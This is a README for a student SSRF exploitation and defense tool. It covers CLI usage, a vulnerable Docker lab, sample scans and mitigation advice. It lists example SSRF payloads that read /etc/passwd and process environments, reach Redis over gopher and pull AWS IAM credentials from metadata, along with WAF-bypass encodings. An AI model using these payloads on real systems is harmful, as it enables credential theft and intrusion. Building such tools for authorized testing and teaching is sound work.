# SEDF — SSRF Exploitation and Defense Framework

> **Final Year Project — BS Computer Science**
> **Authors:** Muhammad Salman Ali & Faisal Hashim
> **Supervisor:** Mr. Mohammad

---

## ⚠ Legal Disclaimer

> This tool is designed for **educational purposes** and **authorized penetration testing ONLY**.
> Using SEDF against systems without **explicit written permission** from the system owner is **illegal** and may result in criminal prosecution.
> The authors accept **no responsibility** for misuse of this tool.

---

## Overview

SEDF is a command-line security testing tool similar to **sqlmap**, but specialized for **Server-Side Request Forgery (SSRF)** vulnerabilities. It automates the process of:

- Discovering SSRF-prone parameters
- Generating and injecting SSRF payloads
- Detecting blind SSRF via OOB callbacks
- Exploiting internal services (Redis, cloud metadata, file system)
- Testing and analysing SSRF defenses
- Generating structured reports (JSON, CSV, terminal)

---

## Features

| Feature | Description | SRS Ref |
|---------|-------------|---------|
| CLI Interface | Full argument-driven command line | FR-01 |
| Parameter Discovery | Auto-detects SSRF-prone URL parameters | FR-02 |
| Payload Generation | 8 payload categories, 100+ built-in payloads | FR-03 |
| Blind SSRF Detection | OOB HTTP/DNS callback server + UUID correlation | FR-04 |
| Port Scanning via SSRF | Internal port probing through SSRF | FR-05 |
| Exploitation Modules | Cloud metadata, Redis, file read | FR-06 |
| Reporting | Terminal, JSON, CSV output | FR-07 |
| Defense Testing | Checks for SSRF mitigations | FR-08 |
| Docker Lab | Intentionally vulnerable local app | Deliverable |

---

## Installation

### Requirements
- Python 3.10+
- pip
- Docker (optional, for lab)

### Install

```bash
git clone https://github.com/yourusername/sedf.git
cd sedf
pip install -r requirements.txt
```

Or install as a package:

```bash
pip install -e .
```

---

## Quick Start

### Start the vulnerable lab (safe local testing):
```bash
python ssrfcli.py --lab
```

### Basic scan:
```bash
python ssrfcli.py -u "http://localhost:5000/fetch?url=FUZZ" --payloads default
```

### Full scan with all payloads:
```bash
python ssrfcli.py -u "http://localhost:5000/fetch?url=FUZZ" --payloads all --threads 10
```

### Blind SSRF detection with OOB callback:
```bash
python ssrfcli.py -u "http://target/?url=FUZZ" --blind --oob-domain mylab.yourdomain.com
```

### Save report:
```bash
python ssrfcli.py -u "http://localhost:5000/fetch?url=FUZZ" --output report --format all
# Produces: report.json, report.csv, report.txt
```

### Defense analysis:
```bash
python ssrfcli.py -u "http://localhost:5000/fetch?url=FUZZ" --defense
```

---

## Usage

```
usage: ssrfcli [-h] [-u URL] [--payloads SET] [--payload-file FILE]
               [--params PARAMS] [--oob-domain DOMAIN]
               [--callback-port PORT] [--blind] [--exploit]
               [--module MODULE] [--ports PORTS] [--internal-ip IP]
               [--defense] [--threads N] [--timeout SECONDS]
               [--delay SECONDS] [--proxy URL] [--headers HEADERS]
               [--method METHOD] [--data DATA] [--cookies COOKIES]
               [--output FILE] [--format FORMAT] [-v] [-q]
               [--safe-mode] [--no-safe-mode] [--confirm] [--lab]
```

### Target
| Argument | Description |
|----------|-------------|
| `-u URL` | Target URL. Use `FUZZ` to mark injection point. Can be a `.txt` file. |

### Payloads
| Argument | Description |
|----------|-------------|
| `--payloads SET` | `default`, `all`, `http`, `file`, `gopher`, `cloud`, `bypass`, `encoded` |
| `--payload-file FILE` | Custom payload file (one per line) |
| `--params PARAMS` | Comma-separated parameter names to test |

### Detection
| Argument | Description |
|----------|-------------|
| `--blind` | Enable blind SSRF detection |
| `--oob-domain DOMAIN` | Domain for DNS/HTTP OOB callbacks |
| `--callback-port PORT` | Local HTTP callback server port (default: 8888) |

### Exploitation
| Argument | Description |
|----------|-------------|
| `--exploit` | Enable exploitation modules |
| `--module MODULE` | `aws_meta`, `gcp_meta`, `azure_meta`, `redis`, `file_read`, `port_scan`, `all` |
| `--ports PORTS` | Ports to scan (comma-separated) |
| `--internal-ip IP` | Internal IP to target (default: 127.0.0.1) |

### Output
| Argument | Description |
|----------|-------------|
| `--output FILE` | Output file (supports `.json`, `.csv`, `.txt`) |
| `--format FORMAT` | `terminal`, `json`, `csv`, `all` |
| `-v` | Verbose output |
| `-q` | Quiet mode (findings only) |

---

## Payload Categories

| Category | Examples |
|----------|---------|
| `http` | `http://127.0.0.1`, `http://[::1]`, `http://0x7f000001` |
| `file` | `file:///etc/passwd`, `file:///proc/self/environ` |
| `gopher` | `gopher://127.0.0.1:6379/_INFO` (Redis via gopher) |
| `cloud` | AWS/GCP/Azure metadata endpoints |
| `bypass` | WAF bypass: octal, hex, unicode, encoded payloads |
| `encoded` | URL/double-encoded variants |

---

## Lab Environment

The Docker lab provides:

| Service | Address | Purpose |
|---------|---------|---------|
| Vulnerable App | `http://localhost:5000` | Primary scan target |
| Redis | `172.20.0.20:6379` | Internal service (gopher exploitation) |
| Metadata Mock | `172.20.0.30:80` | Simulated AWS EC2 metadata |
| Callback Listener | `http://localhost:8888` | OOB blind SSRF callbacks |

### Vulnerable Endpoints

| Endpoint | Vulnerable Param | Vulnerability Type |
|----------|-----------------|-------------------|
| `/fetch?url=` | `url` | Direct SSRF |
| `/image?src=` | `src` | SSRF via image proxy |
| `/webhook` (POST) | `endpoint` | SSRF via webhook |
| `/redirect?next=` | `next` | Open redirect + SSRF |
| `/api/proxy?api_url=` | `api_url` | Internal API SSRF |
| `/read?path=` | `path` | Direct file read |
| `/safe-fetch?url=` | `url` | Protected (for defense testing) |

---

## Project Structure

```
sedf/
├── ssrfcli.py              # Main entry point
├── requirements.txt
├── setup.py
├── README.md
├── sedf/
│   ├── __init__.py
│   ├── cli.py              # Argument parsing & main() (FR-01)
│   ├── scanner.py          # Core scanning engine (FR-02, FR-03, FR-04)
│   ├── payloads/
│   │   ├── generator.py    # Payload generation (FR-03)
│   ├── detection/
│   │   ├── blind.py        # OOB callback server (FR-04)
│   ├── modules/
│   │   ├── port_scanner.py # Port scanning via SSRF (FR-05)
│   │   ├── cloud_meta.py   # Cloud metadata extraction (FR-06)
│   │   ├── redis_gopher.py # Redis via gopher:// (FR-06)
│   │   ├── defense.py      # Defense testing module (FR-08)
│   ├── reporting/
│   │   ├── reporter.py     # JSON/CSV/terminal reports (FR-07)
│   ├── utils/
│   │   ├── http_client.py  # HTTP client with safe-mode
│   │   ├── logger.py       # Colour logging
│   │   ├── banner.py       # ASCII banner & disclaimer
│   │   └── lab.py          # Docker lab launcher
├── docker/
│   ├── docker-compose.yml  # Lab services
│   └── vulnerable_app/
│       ├── app.py          # Intentionally vulnerable Flask app
│       └── Dockerfile
└── tests/
    └── test_sedf.py        # Unit & integration tests
```

---

## Running Tests

```bash
# Run all tests
python -m pytest tests/ -v

# Run with coverage
python -m pytest tests/ --cov=sedf --cov-report=term-missing

# Run a specific test
python -m pytest tests/test_sedf.py::TestPayloadGenerator -v
```

---

## Example Scan Sessions

### Session 1: Basic SSRF Scan

```
$ python ssrfcli.py -u "http://localhost:5000/fetch?url=FUZZ" --payloads default --confirm

  [*] Scanning: http://localhost:5000/fetch?url=FUZZ
      Discovered SSRF candidate params: ['url']
      Testing 1 param(s) × 30 payload(s) = 30 request(s).

  [VULN] SSRF detected!
         URL   : http://localhost:5000/fetch?url=http://127.0.0.1
         Param : url
         Payload: http://127.0.0.1
         Evidence: HTTP 200 on internal IP payload (status: 200)
         Severity: MEDIUM
```

### Session 2: Cloud Metadata Extraction

```
$ python ssrfcli.py -u "http://localhost:5000/fetch?url=FUZZ" --payloads cloud --confirm

  [VULN] SSRF detected!
         Payload: http://169.254.169.254/latest/meta-data/iam/security-credentials/
         Evidence: Cloud metadata indicator found: 'iam/security-credentials'
         Severity: CRITICAL
```

### Session 3: Defense Analysis

```
$ python ssrfcli.py -u "http://localhost:5000/safe-fetch?url=FUZZ" --defense --confirm

  Test: Private IP Blocking
  Status: PROTECTED
  Detail: Request to 127.0.0.1 returned HTTP 403 with filter indicators.
```

---

## Non-Functional Requirements (NFR) Compliance

| NFR | Requirement | Implementation |
|-----|------------|---------------|
| NFR-01 | ≥300 payload tests/minute | ThreadPoolExecutor; typical rate 500+/min |
| NFR-02 | Multi-threading up to 20 threads | `--threads N` capped at 20 |
| NFR-03 | Simple, intuitive CLI | `argparse` with grouped help and examples |
| NFR-04 | No crash on malformed responses | All HTTP calls wrapped in try/except |
| NFR-05 | Safe mode by default | `--safe-mode` on by default; blocks require `--no-safe-mode` |
| NFR-06 | Linux + Windows compatible | Pure Python 3; no OS-specific dependencies |

---

## Remediation Guidance (FR-08)

SEDF provides per-finding remediation advice. General SSRF mitigations:

1. **URL Allowlist** — Only allow requests to known, trusted domains/IPs.
2. **Block Private Ranges** — Deny RFC-1918 + 169.254.0.0/16 at the application layer.
3. **Scheme Restriction** — Only allow `http://` and `https://`.
4. **Disable Cloud Metadata** — Use IMDSv2 (AWS), disable metadata API if unused.
5. **Post-Resolution Validation** — Validate IPs after DNS resolution (prevents DNS rebinding).
6. **Outbound Proxy** — Route all outbound requests through a controlled proxy (e.g. Smokescreen).
7. **Error Sanitisation** — Never expose internal network errors to users.

---

## References

- OWASP SSRF Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- PortSwigger SSRF Labs: https://portswigger.net/web-security/ssrf
- HackTricks SSRF: https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
- AWS IMDS Documentation: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html

---

*SEDF v1.0.0 — BS Computer Science Final Year Project*
